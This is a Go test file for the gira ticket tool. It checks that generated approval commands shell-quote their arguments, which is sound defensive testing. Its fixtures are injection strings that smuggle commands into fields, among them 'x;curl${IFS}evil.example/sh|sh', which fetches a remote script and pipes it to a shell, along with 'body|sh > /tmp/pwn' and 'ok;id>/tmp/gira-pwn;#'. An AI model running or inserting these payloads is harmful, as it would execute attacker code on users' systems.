package gira

import (
	"encoding/json"
	"reflect"
	"strings"
	"testing"
)

func TestApprovalEvidenceJSONIncludesArgv(t *testing.T) {
	approval := TicketNoteApprovalEvidence(TicketNoteReport{
		Repo:   "StatPan/gira",
		Ticket: 126,
		Kind:   "progress",
		Target: "pr",
		Body:   "ok;id>/tmp/gira-pwn;#",
		Targets: []TicketNoteSink{{
			Type:   "pr",
			Number: 127,
		}},
	})

	if !strings.Contains(approval.ApplyCommand, "--body 'ok;id>/tmp/gira-pwn;#' --apply") {
		t.Fatalf("approval command did not quote shell metacharacters: %s", approval.ApplyCommand)
	}

	var payload struct {
		ApplyArgv []string `json:"apply_argv"`
		DryArgv   []string `json:"dry_run_argv"`
	}
	encoded, err := json.Marshal(approval)
	if err != nil {
		t.Fatalf("marshal approval: %v", err)
	}
	if err := json.Unmarshal(encoded, &payload); err != nil {
		t.Fatalf("unmarshal approval: %v", err)
	}

	wantApply := []string{"gira", "ticket", "note", "126", "--repo", "StatPan/gira", "--kind", "progress", "--target", "pr", "--body", "ok;id>/tmp/gira-pwn;#", "--apply"}
	wantDry := append([]string(nil), wantApply...)
	wantDry[len(wantDry)-1] = "--dry-run"
	if !reflect.DeepEqual(payload.ApplyArgv, wantApply) {
		t.Fatalf("apply argv = %#v, want %#v\njson=%s", payload.ApplyArgv, wantApply, encoded)
	}
	if !reflect.DeepEqual(payload.DryArgv, wantDry) {
		t.Fatalf("dry-run argv = %#v, want %#v\njson=%s", payload.DryArgv, wantDry, encoded)
	}
}

func TestWorkStartApprovalQuotesExplicitBaseBranch(t *testing.T) {
	approval := WorkStartApprovalEvidence(WorkStartResult{
		Repo:       "StatPan/gira",
		Issue:      126,
		Branch:     "issue-126-work",
		BaseBranch: "x;curl${IFS}evil.example/sh|sh",
		BaseSource: "explicit --base",
	}, "gira ticket start")

	if !strings.Contains(approval.ApplyCommand, "--base 'x;curl${IFS}evil.example/sh|sh' --apply") {
		t.Fatalf("approval command did not quote explicit base branch: %s", approval.ApplyCommand)
	}

	var payload struct {
		ApplyArgv []string `json:"apply_argv"`
	}
	encoded, err := json.Marshal(approval)
	if err != nil {
		t.Fatalf("marshal approval: %v", err)
	}
	if err := json.Unmarshal(encoded, &payload); err != nil {
		t.Fatalf("unmarshal approval: %v", err)
	}
	want := []string{"gira", "ticket", "start", "126", "--repo", "StatPan/gira", "--base", "x;curl${IFS}evil.example/sh|sh", "--apply"}
	if !reflect.DeepEqual(payload.ApplyArgv, want) {
		t.Fatalf("apply argv = %#v, want %#v\njson=%s", payload.ApplyArgv, want, encoded)
	}
}

func TestTicketSupersedeApprovalQuotesShellMetacharacters(t *testing.T) {
	approval := TicketSupersedeApprovalEvidence(TicketSupersedeReport{
		Repo:      "StatPan/gira",
		Body:      "body|sh > /tmp/pwn",
		Labels:    []string{"area:ai;bad"},
		Milestone: "2.0&(x)",
		Original: TicketSupersedeIssue{
			Number: 64,
		},
		Replacement: TicketSupersedeIssue{
			Title: "x;./pwn",
		},
	})

	for _, want := range []string{
		"--replacement-title 'x;./pwn'",
		"--body 'body|sh > /tmp/pwn'",
		"--label 'area:ai;bad'",
		"--milestone '2.0&(x)'",
	} {
		if !strings.Contains(approval.ApplyCommand, want) {
			t.Fatalf("approval command missing %q: %s", want, approval.ApplyCommand)
		}
	}

	var payload struct {
		ApplyArgv []string `json:"apply_argv"`
	}
	encoded, err := json.Marshal(approval)
	if err != nil {
		t.Fatalf("marshal approval: %v", err)
	}
	if err := json.Unmarshal(encoded, &payload); err != nil {
		t.Fatalf("unmarshal approval: %v", err)
	}
	want := []string{"gira", "ticket", "supersede", "64", "--repo", "StatPan/gira", "--replacement-title", "x;./pwn", "--body", "body|sh > /tmp/pwn", "--label", "area:ai;bad", "--milestone", "2.0&(x)", "--apply"}
	if !reflect.DeepEqual(payload.ApplyArgv, want) {
		t.Fatalf("apply argv = %#v, want %#v\njson=%s", payload.ApplyArgv, want, encoded)
	}
}
